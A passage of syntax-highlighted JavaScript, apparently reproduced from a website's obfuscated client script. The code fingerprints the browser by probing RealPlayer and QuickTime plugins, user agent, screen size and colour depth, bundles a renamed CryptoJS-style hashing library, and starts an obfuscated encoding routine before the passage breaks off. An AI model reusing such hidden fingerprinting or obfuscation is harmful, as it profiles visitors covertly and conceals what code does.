class="keyword">for</span> (<span class="keyword">var</span> r = [<span class="string">&quot;rmocx.RealPlayer G2 Control&quot;</span>, <span class="string">&quot;rmocx.RealPlayer G2 Control.1&quot;</span>, <span class="string">&quot;RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)&quot;</span>, <span class="string">&quot;RealVideo.RealVideo(tm) ActiveX Control (32-bit)&quot;</span>, <span class="string">&quot;RealPlayer&quot;</span>], n = <span class="literal">null</span>, i = <span class="number">0</span>; i &lt; r.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                n = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(r[i])</span><br><span class="line">            &#125; <span class="keyword">catch</span> (o) &#123;</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (n)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        n &amp;&amp; (e = !<span class="number">0</span>,</span><br><span class="line">        t = n.<span class="title class_">GetVersionInfo</span>(),</span><br><span class="line">        t = <span class="built_in">parseFloat</span>(t))</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        t = <span class="keyword">void</span> <span class="number">0</span> == navigator.<span class="property">plugins</span>.<span class="property">RealPlayer</span> ? navigator.<span class="property">plugins</span>.<span class="property">RealPlayer</span> : navigator.<span class="property">plugins</span>.<span class="property">RealPlayer</span>;</span><br><span class="line">    <span class="keyword">return</span> t = <span class="literal">null</span> != t || <span class="keyword">void</span> <span class="number">0</span> != t ? <span class="number">1</span> : <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQuickTimePlayer</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = !<span class="number">1</span></span><br><span class="line">      , t = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            r = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;QuickTime.QuickTime&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (n) &#123;&#125;</span><br><span class="line">        r &amp;&amp; (e = !<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            r = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;QuickTimeCheckObject.QuickTimeCheck&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (n) &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        r &amp;&amp; (e = !<span class="number">0</span>,</span><br><span class="line">        t = r.<span class="property">QuickTimeVersion</span>.<span class="title function_">toString</span>(<span class="number">16</span>),</span><br><span class="line">        t = t.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">1</span>) + <span class="string">&quot;.&quot;</span> + t.<span class="title function_">substring</span>(<span class="number">1</span>, <span class="number">3</span>),</span><br><span class="line">        t = <span class="built_in">parseFloat</span>(t))</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        t = navigator.<span class="property">plugins</span>[<span class="string">&quot;Adobe QuickTime&quot;</span>];</span><br><span class="line">    <span class="keyword">return</span> t = <span class="literal">null</span> != t || <span class="keyword">void</span> <span class="number">0</span> != t ? <span class="number">1</span> : <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getClientUserAgent</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="property">navigator</span>.<span class="property">userAgent</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getScreenXY</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> screen.<span class="property">width</span> + <span class="string">&quot;x &quot;</span> + screen.<span class="property">height</span> + <span class="string">&quot;y&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getOfficeXY</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">availWidth</span> + <span class="string">&quot;x &quot;</span> + <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">availHeight</span> + <span class="string">&quot;y&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">coloriDepth</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t, r = e;</span><br><span class="line">    <span class="keyword">return</span> t = <span class="string">&quot;Netscape&quot;</span> != r ? screen.<span class="property">colorDepth</span> : screen.<span class="property">pixelDepth</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> coypJsDk = coypJsDk || <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">      , n = r.<span class="property">lib</span> = &#123;&#125;</span><br><span class="line">      , i = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">      , o = n.<span class="property">Base</span> = &#123;</span><br><span class="line">        <span class="attr">extend</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            i.<span class="property"><span class="keyword">prototype</span></span> = <span class="variable language_">this</span>;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="keyword">new</span> i;</span><br><span class="line">            <span class="keyword">return</span> e &amp;&amp; t.<span class="title function_">mixIn</span>(e),</span><br><span class="line">            t.<span class="title function_">hasOwnProperty</span>(<span class="string">&quot;init&quot;</span>) || (t.<span class="property">init</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                t.<span class="property">$super</span>.<span class="property">init</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            ),</span><br><span class="line">            t.<span class="property">init</span>.<span class="property"><span class="keyword">prototype</span></span> = t,</span><br><span class="line">            t.<span class="property">$super</span> = <span class="variable language_">this</span>,</span><br><span class="line">            t</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">create</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="title function_">extend</span>();</span><br><span class="line">            <span class="keyword">return</span> e.<span class="property">init</span>.<span class="title function_">apply</span>(e, <span class="variable language_">arguments</span>),</span><br><span class="line">            e</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;,</span><br><span class="line">        <span class="attr">mixIn</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t <span class="keyword">in</span> e)</span><br><span class="line">                e.<span class="title function_">hasOwnProperty</span>(t) &amp;&amp; (<span class="variable language_">this</span>[t] = e[t]);</span><br><span class="line">            e.<span class="title function_">hasOwnProperty</span>(<span class="string">&quot;toString&quot;</span>) &amp;&amp; (<span class="variable language_">this</span>.<span class="property">toString</span> = e.<span class="property">toString</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">clone</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">init</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">extend</span>(<span class="variable language_">this</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , a = n.<span class="property">WordArray</span> = o.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e, r</span>) &#123;</span><br><span class="line">            e = <span class="variable language_">this</span>.<span class="property">words</span> = e || [],</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">sigBytes</span> = r != t ? r : <span class="number">4</span> * e.<span class="property">length</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">toString</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (e || c).<span class="title function_">stringify</span>(<span class="variable language_">this</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">concat</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="property">words</span></span><br><span class="line">              , r = e.<span class="property">words</span></span><br><span class="line">              , n = <span class="variable language_">this</span>.<span class="property">sigBytes</span>;</span><br><span class="line">            <span class="keyword">if</span> (e = e.<span class="property">sigBytes</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">clamp</span>(),</span><br><span class="line">            n % <span class="number">4</span>)</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; e &gt; i; i++)</span><br><span class="line">                    t[n + i &gt;&gt;&gt; <span class="number">2</span>] |= (r[i &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * (i % <span class="number">4</span>) &amp; <span class="number">255</span>) &lt;&lt; <span class="number">24</span> - <span class="number">8</span> * ((n + i) % <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">65535</span> &lt; r.<span class="property">length</span>)</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>; e &gt; i; i += <span class="number">4</span>)</span><br><span class="line">                    t[n + i &gt;&gt;&gt; <span class="number">2</span>] = r[i &gt;&gt;&gt; <span class="number">2</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                t.<span class="property">push</span>.<span class="title function_">apply</span>(t, r);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">sigBytes</span> += e,</span><br><span class="line">            <span class="variable language_">this</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">clamp</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="property">words</span></span><br><span class="line">              , r = <span class="variable language_">this</span>.<span class="property">sigBytes</span>;</span><br><span class="line">            t[r &gt;&gt;&gt; <span class="number">2</span>] &amp;= <span class="number">4294967295</span> &lt;&lt; <span class="number">32</span> - <span class="number">8</span> * (r % <span class="number">4</span>),</span><br><span class="line">            t.<span class="property">length</span> = e.<span class="title function_">ceil</span>(r / <span class="number">4</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">clone</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = o.<span class="property">clone</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">            <span class="keyword">return</span> e.<span class="property">words</span> = <span class="variable language_">this</span>.<span class="property">words</span>.<span class="title function_">slice</span>(<span class="number">0</span>),</span><br><span class="line">            e</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">random</span>: <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = [], n = <span class="number">0</span>; t &gt; n; n += <span class="number">4</span>)</span><br><span class="line">                r.<span class="title function_">push</span>(<span class="number">4294967296</span> * e.<span class="title function_">random</span>() | <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> a.<span class="title function_">init</span>(r,t)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      , s = r.<span class="property">enc</span> = &#123;&#125;</span><br><span class="line">      , c = s.<span class="property">Hex</span> = &#123;</span><br><span class="line">        <span class="attr">stringify</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = e.<span class="property">words</span>;</span><br><span class="line">            e = e.<span class="property">sigBytes</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = [], n = <span class="number">0</span>; e &gt; n; n++) &#123;</span><br><span class="line">                <span class="keyword">var</span> i = t[n &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * (n % <span class="number">4</span>) &amp; <span class="number">255</span>;</span><br><span class="line">                r.<span class="title function_">push</span>((i &gt;&gt;&gt; <span class="number">4</span>).<span class="title function_">toString</span>(<span class="number">16</span>)),</span><br><span class="line">                r.<span class="title function_">push</span>((<span class="number">15</span> &amp; i).<span class="title function_">toString</span>(<span class="number">16</span>))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> r.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">parse</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="property">length</span>, r = [], n = <span class="number">0</span>; t &gt; n; n += <span class="number">2</span>)</span><br><span class="line">                r[n &gt;&gt;&gt; <span class="number">3</span>] |= <span class="built_in">parseInt</span>(e.<span class="title function_">substr</span>(n, <span class="number">2</span>), <span class="number">16</span>) &lt;&lt; <span class="number">24</span> - <span class="number">4</span> * (n % <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> a.<span class="title function_">init</span>(r,t / <span class="number">2</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , l = s.<span class="property">Latin1</span> = &#123;</span><br><span class="line">        <span class="attr">stringify</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = e.<span class="property">words</span>;</span><br><span class="line">            e = e.<span class="property">sigBytes</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = [], n = <span class="number">0</span>; e &gt; n; n++)</span><br><span class="line">                r.<span class="title function_">push</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(t[n &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * (n % <span class="number">4</span>) &amp; <span class="number">255</span>));</span><br><span class="line">            <span class="keyword">return</span> r.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">parse</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="property">length</span>, r = [], n = <span class="number">0</span>; t &gt; n; n++)</span><br><span class="line">                r[n &gt;&gt;&gt; <span class="number">2</span>] |= (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(n)) &lt;&lt; <span class="number">24</span> - <span class="number">8</span> * (n % <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> a.<span class="title function_">init</span>(r,t)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , h = s.<span class="property">Utf8</span> = &#123;</span><br><span class="line">        <span class="attr">stringify</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(<span class="built_in">escape</span>(l.<span class="title function_">stringify</span>(e)))</span><br><span class="line">            &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="title class_">Error</span>(<span class="string">&quot;Malformed UTF-8 data&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">parse</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> l.<span class="title function_">parse</span>(<span class="built_in">unescape</span>(<span class="built_in">encodeURIComponent</span>(e)))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , u = n.<span class="property">BufferedBlockAlgorithm</span> = o.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">reset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_data</span> = <span class="keyword">new</span> a.<span class="property">init</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_nDataBytes</span> = <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_append</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> e &amp;&amp; (e = h.<span class="title function_">parse</span>(e)),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_data</span>.<span class="title function_">concat</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_nDataBytes</span> += e.<span class="property">sigBytes</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_process</span>: <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = <span class="variable language_">this</span>.<span class="property">_data</span></span><br><span class="line">              , n = r.<span class="property">words</span></span><br><span class="line">              , i = r.<span class="property">sigBytes</span></span><br><span class="line">              , o = <span class="variable language_">this</span>.<span class="property">blockSize</span></span><br><span class="line">              , s = i / (<span class="number">4</span> * o)</span><br><span class="line">              , s = t ? e.<span class="title function_">ceil</span>(s) : e.<span class="title function_">max</span>((<span class="number">0</span> | s) - <span class="variable language_">this</span>.<span class="property">_minBufferSize</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (t = s * o,</span><br><span class="line">            i = e.<span class="title function_">min</span>(<span class="number">4</span> * t, i),</span><br><span class="line">            t) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; t &gt; c; c += o)</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="title function_">_doProcessBlock</span>(n, c);</span><br><span class="line">                c = n.<span class="title function_">splice</span>(<span class="number">0</span>, t),</span><br><span class="line">                r.<span class="property">sigBytes</span> -= i</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> a.<span class="title function_">init</span>(c,i)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">clone</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = o.<span class="property">clone</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">            <span class="keyword">return</span> e.<span class="property">_data</span> = <span class="variable language_">this</span>.<span class="property">_data</span>.<span class="title function_">clone</span>(),</span><br><span class="line">            e</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_minBufferSize</span>: <span class="number">0</span></span><br><span class="line">    &#125;);</span><br><span class="line">    n.<span class="property">Hasher</span> = u.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: o.<span class="title function_">extend</span>(),</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cfg</span> = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">reset</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">reset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            u.<span class="property">reset</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doReset</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">update</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">_append</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_process</span>(),</span><br><span class="line">            <span class="variable language_">this</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">finalize</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> e &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">_append</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doFinalize</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">blockSize</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="attr">_createHelper</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">t, r</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> e.<span class="title function_">init</span>(r).<span class="title function_">finalize</span>(t)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_createHmacHelper</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">t, r</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> p.<span class="property">HMAC</span>.<span class="title function_">init</span>(e,r).<span class="title function_">finalize</span>(t)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> p = r.<span class="property">algo</span> = &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;(<span class="title class_">Math</span>)</span><br><span class="line">  , process = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = -<span class="number">979402</span></span><br><span class="line">      , r = <span class="number">979402</span>;</span><br><span class="line">    _nuz = -<span class="number">705100</span>,</span><br><span class="line">    _nux = <span class="number">705102</span>,</span><br><span class="line">    _mlq = <span class="number">1</span>,</span><br><span class="line">    _zmmn = -<span class="number">1</span>,</span><br><span class="line">    _xhce = <span class="number">664917</span>,</span><br><span class="line">    _pvaa = -<span class="number">713216</span>,</span><br><span class="line">    _tmlq = <span class="number">713456</span>,</span><br><span class="line">    _bbm = <span class="number">933985</span>,</span><br><span class="line">    _lxz = <span class="number">33853</span>,</span><br><span class="line">    _sbx = -<span class="number">93056</span>,</span><br><span class="line">    _nnuy = <span class="string">&quot;lit&quot;</span>,</span><br><span class="line">    _uuz = <span class="string">&quot;map&quot;</span>,</span><br><span class="line">    _jggu = <span class="string">&quot;it&quot;</span>,</span><br><span class="line">    _yyf = <span class="string">&quot;function&quot;</span>,</span><br><span class="line">    _oos = <span class="string">&quot;_&quot;</span>,</span><br><span class="line">    _hsvuz = <span class="string">&quot;sub&quot;</span>,</span><br><span class="line">    _isus = <span class="string">&quot;cha&quot;</span>,</span><br><span class="line">    _paww = <span class="string">&quot;str&quot;</span>,</span><br><span class="line">    _lyydw = <span class="string">&quot;sp&quot;</span>,</span><br><span class="line">    _qndkq = <span class="string">&quot;cha&quot;</span>,</span><br><span class="line">    _muzz = <span class="string">&quot;spl&quot;</span>,</span><br><span class="line">    _unny = <span class="string">&quot;base&quot;</span>,</span><br><span class="line">    _heeqc = <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">var</span> n = &#123;</span><br><span class="line">        <span class="attr">_base</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">_baseTable</span>: <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>,</span><br><span class="line">        <span class="attr">_baseTables</span>: [-<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, <span class="number">62</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, <span class="number">63</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, 